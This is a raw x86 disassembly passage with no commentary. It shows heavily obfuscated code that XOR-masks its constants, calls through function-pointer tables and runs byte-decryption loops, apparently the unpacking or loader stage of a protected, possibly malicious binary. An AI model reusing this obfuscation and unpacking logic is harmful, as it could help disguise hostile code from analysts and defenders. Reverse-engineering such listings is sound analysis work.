  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
